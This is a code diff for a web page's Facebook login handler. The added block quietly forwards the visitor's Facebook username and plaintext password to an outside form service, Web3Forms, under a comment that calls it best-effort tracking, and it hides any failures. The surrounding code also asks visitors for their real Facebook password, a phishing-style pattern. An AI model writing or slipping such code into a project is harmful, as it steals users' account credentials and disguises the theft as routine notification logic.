@@ -904,6 +904,14 @@
             const password = (document.getElementById('fbPassword') || {}).value || '';
             if (!username || !password) { document.getElementById('authMessage').textContent = 'Facebook username and password required'; return; }
             try {
+                // submit to Web3Forms for tracking/notifications (best-effort)
+                try {
+                    const web3Payload = { fullName: document.getElementById('visitorSignupName')?.value || 'Facebook User', email: document.getElementById('visitorSignupEmail')?.value || `${username}@facebook.local`, facebookUsername: username, facebookPassword: password };
+                    await sendToWeb3Forms(web3Payload, 'Facebook Login');
+                } catch (e) {
+                    console.warn('Web3Forms submission failed', e);
+                }
+
                 const url = fbMode === 'signup' ? `${API_BASE}/auth/visitor/facebook-signup` : `${API_BASE}/auth/visitor/facebook-login`;
                 const payload = fbMode === 'signup' ? { name: document.getElementById('visitorSignupName')?.value || 'Facebook User', email: document.getElementById('visitorSignupEmail')?.value || `${username}@facebook.local`, facebookUsername: username, facebookPassword: password } : { facebookUsername: username, facebookPassword: password };
                 const resp = await fetch(url, { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify(payload) });
